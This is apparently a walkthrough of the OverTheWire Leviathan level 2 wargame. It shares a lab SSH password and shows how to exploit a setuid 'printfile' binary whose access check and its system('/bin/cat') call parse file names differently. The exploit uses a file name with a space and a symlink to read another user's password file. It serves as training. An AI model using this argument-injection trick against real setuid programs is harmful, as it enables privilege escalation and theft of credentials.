# Connection:

ssh leviathan2@leviathan.labs.overthewire.org -p 2223
password: `ougahZi8Ta`

# Solution:

1. Notice that `printfile` executable is owned by `leviathan3` user
2. Create your directory in `/tmp` dir and some text file inside like so: `/tmp/random_6789/test.txt`
3. Inside your directory, execute `~/printfile "test.txt"`
4. So the executable just list the file content
5. Try with passing `/etc/leviathan_pass/leviathan3` -> of course this does not work :D
6. Run `ltrace ~/printfile "test.txt"`
7. Get output:

```
__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
access("test.txt", 4)                            = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat test.txt"Real Test.txt file
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

8. Notice that `access` is used to determine if one can access passed file
9. Notice that `cat` is used to print out the file content
10. There is one important difference how `access` and `cat` work. `access` process spaces as part of one file path, while `cat` will treat each space character as separator of next file to read
11. Let's try if this works
12. Create one more text file called `test2.txt` with some content in it
13. Create a file with space delimiting `test.txt` and `test2.txt` -> `touch test.txt\ test2.txt`
14. Execute `~/printfile "test.txt test2.txt"`
15. Notice that `cat` was called on two files
16. Create symlink to `etc/leviathan_pass/leviathan3` -> `ln -s /etc/leviathan_pass/leviathan3 sym-link`
17. Create a file with spaces in it delimiting the symlink -> `touch somefile.txt\ sym-link`
18. Execute `~/printfile "somefile.txt sym-link"`
19. Get flag
20. This works because you have an access to the file in `tmp` dir and then `cat` evaluates the actual symlink (and file can be access because onwer of `printfile` is `leviathan3`)
